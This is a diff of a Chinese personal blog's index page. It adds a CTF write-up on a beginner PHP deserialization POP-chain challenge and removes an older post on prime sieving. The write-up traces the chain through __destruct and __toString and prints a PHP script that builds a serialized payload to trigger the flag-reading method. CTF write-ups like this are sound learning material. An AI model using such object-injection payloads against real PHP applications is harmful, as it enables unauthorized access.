@@ -119,7 +119,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">80</span>
+          <span class="site-state-item-count">81</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -149,6 +149,108 @@
 
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/02/27/pop1/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="王">
+      <meta itemprop="description" content="喵个咪">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="SCP基金会中国分部驻406特别行动队">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2023/02/27/pop1/" class="post-title-link" itemprop="url">pop1</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2023-02-27 16:24:08 / 修改时间：17:35:25" itemprop="dateCreated datePublished" datetime="2023-02-27T16:24:08+08:00">2023-02-27</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>pop链的一道入门题</p>
+<p><img src="https://s2.loli.net/2023/02/27/GQ3UjpReytABiwT.png" alt="0.PNG"></p>
+<p>粗略看一看</p>
+<p>在w44m这个类中有出现关键词flag以及调用读取flag的语句</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">include(&#x27;flag.php&#x27;);</span><br><span class="line">            echo $flag;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>因此我们将这个类作为全链的链尾</p>
+<p>接下来看看怎么才能调用这个函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">class w33m&#123;</span><br><span class="line">    public $w00m;</span><br><span class="line">    public $w22m;</span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        $this-&gt;w00m-&gt;&#123;$this-&gt;w22m&#125;();</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>目光看向w33m这个类</p>
+<p>这里有一个</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$this-&gt;w00m-&gt;&#123;$this-&gt;w22m&#125;()</span><br></pre></td></tr></table></figure>
+
+<p>这里能够调用w44m，因此我们链条的第二步可以确认为w33m</p>
+<p>我们只需将w00m赋予一个w44m 再将w22m赋一个getflag</p>
+<p>(-&gt;就当成“的”,这段代码就变成了w44m的getflag 就是调用w44m中的getflag函数)</p>
+<p>接下来就是如何调用w33m这个类了</p>
+<p>目光投向w33m中出现的一个函数:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__toString()  类被当成字符串时被调用，如出现echo或者pre_match时</span><br></pre></td></tr></table></figure>
+
+<p>在w22m中出现了echo:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">class w22m&#123;</span><br><span class="line">    public $w00m;</span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        echo $this-&gt;w00m;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>因此 w33m的上一步就应该是w22m</p>
+<p>我们直接在w22m中的w00m赋值w33m就可以了</p>
+<p>最后就是w22m如何调用了：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__destruct()  类的析构函数，在对象被销毁时被调用</span><br></pre></td></tr></table></figure>
+
+<p>很明显 这就是该链的头了</p>
+<p>稍微梳理一下:</p>
+<p><strong>w22m(__destruct() )—–&gt;w33m( __toString())——-&gt;w44m(getflag())</strong></p>
+<p>开始构造exp：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class w44m&#123;</span><br><span class="line">	private $admin=&#x27;w44m&#x27;;</span><br><span class="line">    protected $passwd=&#x27;08067&#x27;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class w22m&#123;</span><br><span class="line">	public $w00m;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class w33m&#123;</span><br><span class="line">	public $w00m;</span><br><span class="line">	public $w22m;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a=new w22m;</span><br><span class="line">$a-&gt;w00m=new w33m;</span><br><span class="line">$a-&gt;w00m-&gt;w00m=new w44m;</span><br><span class="line">$a-&gt;w00m-&gt;w22m=&#x27;Getflag&#x27;;</span><br><span class="line"></span><br><span class="line">echo urlencode(serialize($a));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2023/02/27/6y4OvxzWEd19TPu.png" alt="2.PNG"></p>
+<p><img src="https://s2.loli.net/2023/02/27/oNDlvCwUMzt1ihK.png" alt="1.PNG"></p>
+<p>蛮有意思</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
@@ -899,89 +1001,8 @@
 
 
 
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/09/20/%E7%AD%9B%E6%B3%95/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="王">
-      <meta itemprop="description" content="喵个咪">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="SCP基金会中国分部驻406特别行动队">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2022/09/20/%E7%AD%9B%E6%B3%95/" class="post-title-link" itemprop="url">筛法</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-      
-
-      <time title="创建时间：2022-09-20 16:12:06 / 修改时间：16:23:58" itemprop="dateCreated datePublished" datetime="2022-09-20T16:12:06+08:00">2022-09-20</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <p> <u>埃氏筛法求素数(python)</u></p>
-<p>原来写的暴力穷举：</p>
-<p><img src="https://s2.loli.net/2022/09/20/epjfTBCFE3qNokd.png" alt="2.PNG"></p>
-<p>源代码：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">print(&quot;请输入N的值&quot;)</span><br><span class="line">N = int(input())</span><br><span class="line">list1=[]</span><br><span class="line">print(&quot;正在载入素数 请稍候\n&quot;)</span><br><span class="line">time_start = time.time()</span><br><span class="line">for i in range(2, N):</span><br><span class="line">    for k in range(2, i):</span><br><span class="line">        if i % k == 0:</span><br><span class="line">            break</span><br><span class="line">    else:list1.append(i)</span><br><span class="line">print(list1)</span><br><span class="line"></span><br><span class="line">time_end = time.time()</span><br><span class="line">time_sum = time_end - time_start</span><br><span class="line">print(time_sum)</span><br></pre></td></tr></table></figure>
-
-<p>计算100000内的素数耗时极长：</p>
-<p><img src="https://s2.loli.net/2022/09/20/hW8ZtnlojqrSaiV.png" alt="3.PNG"></p>
-<p>超过12s</p>
-<p><u>筛法求素数：</u></p>
-<p><img src="https://s2.loli.net/2022/09/20/MEiUpBfDd8zTaSH.png" alt="1.PNG"></p>
-<p>源代码：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">n=int(input(&quot;请输入上限n：\n&quot;))</span><br><span class="line">list1=[]#筛选出的素数存放于此</span><br><span class="line">time_start = time.time()#初始化计时</span><br><span class="line">yinsuo=[True]*(n+1)#初始化引索 默认所有数皆为素数</span><br><span class="line">for i in range(2,n):#已知2为素数 从2开始遍历</span><br><span class="line">    if yinsuo[i]:#素数存入list1内</span><br><span class="line">        list1.append(i)</span><br><span class="line">        for item in range(i+i,n,i):#设置步长为i 遍历筛去所有i的倍数</span><br><span class="line">            yinsuo[item]=False</span><br><span class="line">time_end = time.time()</span><br><span class="line">time_sum = time_end - time_start</span><br><span class="line">print(list1)</span><br><span class="line">print(time_sum)</span><br></pre></td></tr></table></figure>
-
-<p>计算100000以内素数耗时短：</p>
-<p><img src="https://s2.loli.net/2022/09/20/dnuvGqlRAhJVBgS.png" alt="4.PNG"></p>
-<p>不到0.01s</p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
   <nav class="pagination">
-    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/8/">8</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/9/">9</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
   </nav>
 
 </div>
